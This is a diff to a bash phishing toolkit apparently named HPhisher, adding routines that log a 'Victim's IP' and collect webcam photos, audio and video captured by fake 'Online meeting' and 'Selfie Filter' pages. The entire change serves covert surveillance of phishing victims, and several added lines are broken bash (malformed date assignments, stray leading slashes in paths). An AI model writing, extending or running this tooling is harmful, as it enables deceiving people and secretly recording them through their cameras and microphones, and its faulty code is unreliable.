@@ -22,8 +22,16 @@ RESETBG="$(printf '\e[0m\n')" #Reset background
 
 #Directories
 pro_dir=$(pwd) #project directory
+files_dir="${pro_dir}/files"
 server_dir="${pro_dir}/.server" #server directory
 sites_dir="${pro_dir}/.sites" #sites directory
+
+#Time
+date= $date + %F
+time_hour= $date + %H
+time_minute= $date + %M
+time_sec= $date + %S
+time= "${time_hour}:${time_minute}:${time_sec}"
 
 #Normal Banner
 banner(){
@@ -77,6 +85,18 @@ else
 fi
 if [[ -e ".cld.log" ]]; then
         rm -rf ".cld.log"
+fi
+if [[ ! -d "files" ]]; then
+        mkdir -p "files"
+fi
+if [[ ! -d "files/audio" ]]; then
+        mkdir -p "files/audio"
+fi
+if [[ ! -d "files/video" ]]; then
+        mkdir -p "files/video"
+fi
+if [[ ! -d "files/image" ]]; then
+        mkdir -p "files/image"
 fi
 }
 
@@ -457,6 +477,16 @@ capture_data_check(){
         fi
 }
 
+## Get IP address
+capture_ip() {
+        IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
+        IFS=$'\n'
+        echo -e "\n${RED} Victim's IP : ${RED}$IP"
+			file_folder= "${date}-${time}"
+				mkdir /${files_dir}/${file_folder}
+        echo -ne "\n${BLUE} Saved in : ${ORANGE} ${pro_dir}/files/${site_name}/${file_folder}/ip.txt"
+	      mv /.server/www/ip.txt /${files_dir}/${file_folder}
+}
 capture_data_image() {
         echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
   while true; do
@@ -466,13 +496,60 @@ capture_data_image() {
                         rm -rf .server/www/ip.txt
                 fi
                 sleep 0.75
-								if [[ -e "Log.log" ]]; then
+								if [[ -e ".server/www/Log.log" ]]; then
 									printf "${GREEN} Cam file received! ${NC}"
 									rm -rf Log.log
+									shopt -s globstar
+									for f in /.server/www/*.{jpg,jpeg,webp}; do
+									 mv -- "$f" /${files_dir}
+								 done
 								fi
                 sleep 0.5
 	done
 }
+
+capture_data_audio() {
+        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+  while true; do
+                if [[ -e ".server/www/ip.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+                        capture_ip
+                        rm -rf .server/www/ip.txt
+                fi
+                sleep 0.75
+								if [[ -e "/.server/www/Log.log" ]]; then
+									printf "${GREEN} Audio file received! ${NC}"
+									rm -rf Log.log
+									shopt -s globstar
+									for f in /.server/www/*.{wav,ogg,mp3}; do
+									 mv -- "$f" /${files_dir}
+								 done
+								fi
+                sleep 0.5
+	done
+}
+
+capture_data_video() {
+        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+  while true; do
+                if [[ -e ".server/www/ip.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+                        capture_ip
+                        rm -rf .server/www/ip.txt
+                fi
+                sleep 0.75
+								if [[ -e ".server/www/Log.log" ]]; then
+									printf "${GREEN} Video file received! ${NC}"
+									rm -rf Log.log
+									shopt -s globstar
+									for f in /.server/www/*.{mp4,webm}; do
+									 mv -- "$f" /${files_dir}
+								 done
+								fi
+                sleep 0.5
+	done
+}
+
 mainmenu() {
 echo -e " "
 echo -e " "
@@ -591,9 +668,11 @@ esac
 }
 
 site_video(){
+duration=5000
 echo -e "${BLUE}[01]${CYAN} Default ${NC}"
-echo -e "${BLUE}[01]${CYAN} Online meeting ${NC}"
-echo -e "${BLUE}[01]${CYAN} Selfie Filter ${NC}"
+echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
+echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
+echo -e "${BLUE}[d]${RED} Change duration (default=${duration}) ${NC}"
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
 case $choice in
@@ -606,6 +685,10 @@ case $choice in
 				3 | 03)
 								site_template="filter"
 								tunnel_menu;;
+				d | D)
+				        echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Type your video duration : ${BLUE}"
+				        read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" duration
+							  site_video;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                         { sleep 1; banner; site_video; };;
@@ -614,8 +697,8 @@ esac
 
 site_video_audio(){
 echo -e "${BLUE}[01]${CYAN} Default ${NC}"
-echo -e "${BLUE}[01]${CYAN} Online meeting ${NC}"
-echo -e "${BLUE}[01]${CYAN} Selfie Filter ${NC}"
+echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
+echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
 case $choice in
